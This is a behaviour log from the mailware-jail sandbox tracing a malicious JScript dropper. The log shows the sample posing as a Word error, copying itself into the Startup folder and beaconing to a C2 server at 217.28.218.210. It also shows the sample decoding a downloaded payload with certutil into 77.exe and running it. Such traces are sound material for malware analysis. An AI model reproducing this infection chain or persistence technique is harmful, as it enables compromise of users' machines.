17 Dec 09:20:26 - mailware-jail, a malware sandbox ver. 0.10
17 Dec 09:20:26 - ------------------------
17 Dec 09:20:26 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/browser.js,env/agents.js,env/other.js,env/console.js
17 Dec 09:20:26 - Malware files: malware/20161216/malware.js
17 Dec 09:20:26 - Output file for sandbox dump: sandbox_dump_after.json
17 Dec 09:20:26 - Output directory for generated files: output/
17 Dec 09:20:26 - ==> Preparing Sandbox environment.
17 Dec 09:20:26 -  => Executing: env/utils.js quitely
17 Dec 09:20:26 -  => Executing: env/eval.js quitely
17 Dec 09:20:26 -  => Executing: env/function.js quitely
17 Dec 09:20:26 -  => Executing: env/wscript.js quitely
17 Dec 09:20:26 -  => Executing: env/browser.js quitely
17 Dec 09:20:26 -  => Executing: env/agents.js quitely
17 Dec 09:20:26 -  => Executing: env/other.js quitely
17 Dec 09:20:26 -  => Executing: env/console.js quitely
17 Dec 09:20:26 - ==> Executing malware file(s). =========================================
17 Dec 09:20:26 -  => Executing: malware/20161216/malware.js verbosely, reporting silent catches
17 Dec 09:20:26 - Saving: output/malware_20161216_malware.js
17 Dec 09:20:26 - WScript.scriptfullname = (string) 'malware/20161216/malware.js'
17 Dec 09:20:26 - WScript.arguments = (object) 'malware/20161216/malware.js,xyz'
17 Dec 09:20:26 - WScript.CreateObject(WScript.Shell)
17 Dec 09:20:26 - new WScript.Shell[10]
17 Dec 09:20:26 - ActiveXObject(Scripting.FileSystemObject)
17 Dec 09:20:26 - new Scripting.FileSystemObject[11]
17 Dec 09:20:26 - ActiveXObject(ADODB.Stream)
17 Dec 09:20:26 - new ADODB_Stream[12]
17 Dec 09:20:26 - ActiveXObject(Shell.Application)
17 Dec 09:20:26 - new Shell.Application[13]
17 Dec 09:20:26 - WScript.Shell[10].ExpandEnvironmentStrings(%TEMP%) => C:\Users\User\AppData\Local\Temp
17 Dec 09:20:26 - ActiveXObject(Msxml2.ServerXMLHTTP)
17 Dec 09:20:26 - new MSXML2.XMLHTTP[14]
17 Dec 09:20:26 - MSXML2.XMLHTTP[14].onreadystatechange = (undefined) 'undefined'
17 Dec 09:20:26 - new Folder2[15](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
17 Dec 09:20:26 - new FolderItem[16](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
17 Dec 09:20:26 - FolderItem[16](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).name = (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
17 Dec 09:20:26 - FolderItem[16](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).path = (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
17 Dec 09:20:26 - Folder2[15](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).self = (object) 'FolderItem[16](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)'
17 Dec 09:20:26 - Shell.Application[13].Namespace(7) => Folder2[15](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
17 Dec 09:20:26 - WScript.scriptfullname.get() => (string) 'malware/20161216/malware.js'
17 Dec 09:20:26 - Folder2[15](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).self.get() => (object) 'FolderItem[16](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)'
17 Dec 09:20:26 - FolderItem[16](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).path.get() => (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
17 Dec 09:20:26 - WScript.Popup(Word cannot open the document: user does not have access privileges,473,Error:,16)
17 Dec 09:20:26 - Scripting.FileSystemObject[11].CopyFile(malware/20161216/malware.js, C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\plugins.refresh.jse)
17 Dec 09:20:26 - Scripting.FileSystemObject[11].DeleteFile(malware/20161216/malware.js)
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].setOption(3,MSXML)
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].open(GET,https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&168&uid=1715861367&out=0&ver=20,false)
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].method = (string) 'GET'
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].url = (string) 'https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&168&uid=1715861367&out=0&ver=20'
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].async = (boolean) 'false'
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].async.get() => (boolean) 'false'
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].send(undefined)
17 Dec 09:20:34 - MSXML2.XMLHTTP[14] Not sending data, if you want to interact with remote server, set --down=y
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].responsebody = (string) 'Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use ... (truncated)'
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].status = (number) '200'
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].readystate = (number) '4'
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].onreadystatechange.get() => (undefined) 'undefined'
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].send(undefined) finished
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].status.get() => (number) '200'
17 Dec 09:20:34 - Scripting.FileSystemObject[11].FileExists(C:\Users\User\AppData\Local\Temp\77.exe) => false
17 Dec 09:20:34 - Scripting.FileSystemObject[11].DeleteFile(C:\Users\User\AppData\Local\Temp\77.exe)
17 Dec 09:20:34 - Scripting.FileSystemObject[11].FileExists(C:\Users\User\AppData\Local\Temp\223.cc1) => false
17 Dec 09:20:34 - Scripting.FileSystemObject[11].DeleteFile(C:\Users\User\AppData\Local\Temp\223.cc1)
17 Dec 09:20:34 - MSXML2.XMLHTTP[14].ResponseText.get() => (string) 'Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use ... (truncated)'
17 Dec 09:20:34 - Scripting.FileSystemObject[11].CreateTextFile(C:\Users\User\AppData\Local\Temp\223.cc1)
17 Dec 09:20:34 - new TextStream[17]
17 Dec 09:20:34 - TextStream[17].WriteLine(Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use ... (truncated))
17 Dec 09:20:34 - FS.writeFile(C:\Users\User\AppData\Local\Temp\223.cc1, Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use ... (truncated))
17 Dec 09:20:34 - TextStream[17].Close()
17 Dec 09:20:34 - WScript.Sleep(5000)
17 Dec 09:20:39 - Shell.Application[13].ShellExecute(certutil,-decode C:\Users\User\AppData\Local\Temp\223.cc1 C:\Users\User\AppData\Local\Temp\77.exe,,open,0)
17 Dec 09:20:39 - WScript.Sleep(30000)
17 Dec 09:21:09 - Scripting.FileSystemObject[11].FileExists(C:\Users\User\AppData\Local\Temp\77.exe) => false
17 Dec 09:21:09 - Scripting.FileSystemObject[11].GetFile(C:\Users\User\AppData\Local\Temp\77.exe) => C:\Users\User\AppData\Local\Temp\77.exe
17 Dec 09:21:09 - new FileObject[18](C:\Users\User\AppData\Local\Temp\77.exe)
17 Dec 09:21:09 - FileObject[18](C:\Users\User\AppData\Local\Temp\77.exe).OpenAsTextStream(1)
17 Dec 09:21:09 - new TextStream[19]
17 Dec 09:21:09 - TextStream[19].ReadLine()
17 Dec 09:21:09 - WScript.Shell[10].Exec(C:\Users\User\AppData\Local\Temp\77.exe)
17 Dec 09:21:09 - new Process[20](C:\Users\User\AppData\Local\Temp\77.exe)
17 Dec 09:21:09 - Process[20](C:\Users\User\AppData\Local\Temp\77.exe).processid = (number) '20'
17 Dec 09:21:09 - new TextStream[21]
17 Dec 09:21:09 - Process[20](C:\Users\User\AppData\Local\Temp\77.exe).stdout = (object) 'TextStream[21]'
17 Dec 09:21:09 - new TextStream[22]
17 Dec 09:21:09 - Process[20](C:\Users\User\AppData\Local\Temp\77.exe).stderr = (object) 'TextStream[22]'
17 Dec 09:21:09 - new TextStream[23]
17 Dec 09:21:09 - Process[20](C:\Users\User\AppData\Local\Temp\77.exe).stdin = (object) 'TextStream[23]'
17 Dec 09:21:09 - Process[20](C:\Users\User\AppData\Local\Temp\77.exe).processid.get() => (number) '20'
17 Dec 09:21:09 - WScript.Sleep(10010)
17 Dec 09:21:19 - Scripting.FileSystemObject[11].FileExists(C:\Users\User\AppData\Local\Temp\77.exe) => false
17 Dec 09:21:19 - Scripting.FileSystemObject[11].DeleteFile(C:\Users\User\AppData\Local\Temp\77.exe)
17 Dec 09:21:19 - TextStream[19].Close()
17 Dec 09:21:19 - WScript.Sleep(120000)
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].setOption(3,MSXML)
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].open(GET,https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&65&uid=1715861367&out=20&ver=20,false)
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].method = (string) 'GET'
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].url = (string) 'https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&65&uid=1715861367&out=20&ver=20'
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].async = (boolean) 'false'
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].async.get() => (boolean) 'false'
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].send(undefined)
17 Dec 09:23:19 - MSXML2.XMLHTTP[14] Not sending data, if you want to interact with remote server, set --down=y
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].responsebody = (string) 'Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use --down=y to download the real payload.?Dumy conntent, use ... (truncated)'
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].status = (number) '200'
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].readystate = (number) '4'
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].onreadystatechange.get() => (undefined) 'undefined'
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].send(undefined) finished
17 Dec 09:23:19 - MSXML2.XMLHTTP[14].status.get() => (number) '200'
17 Dec 09:23:19 - FIXME: WScript.Shell[10].RegRead(HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\) - unknown key
17 Dec 09:23:19 - WScript.Shell[10].RegRead(HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\) => undefined
17 Dec 09:23:19 - ==> Cleaning up sandbox.
17 Dec 09:23:19 - ==> Script execution finished, dumping sandbox environment to a file.
17 Dec 09:23:19 - The sandbox context has been  saved to: sandbox_dump_after.json
17 Dec 09:23:19 - Saving: output/C__Users_User_AppData_Local_Temp_223.cc1
